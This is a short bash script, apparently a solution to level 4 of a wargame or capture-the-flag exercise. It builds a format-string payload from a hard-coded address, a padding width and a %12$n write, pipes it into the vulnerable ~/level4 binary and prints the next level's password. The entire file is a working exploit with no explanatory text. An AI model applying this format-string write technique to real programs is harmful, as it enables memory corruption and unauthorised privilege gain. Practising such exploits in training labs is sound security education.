#!/bin/bash

set -x

WRITE_ADDRESS="\x10\x98\x04\x08" # 0x08049810
PADDING="%16930112x"
WRITE_MODIFIER='%12$n'

python -c "print('$WRITE_ADDRESS' + '$PADDING' + '$WRITE_MODIFIER')" > /tmp/exploit4

(cat /tmp/exploit4 | ~/level4) > /tmp/output4

PASS=`cat /tmp/output4 | tr -d ' ' | head -1`
echo -e "\nNext pass is:  $PASS\n"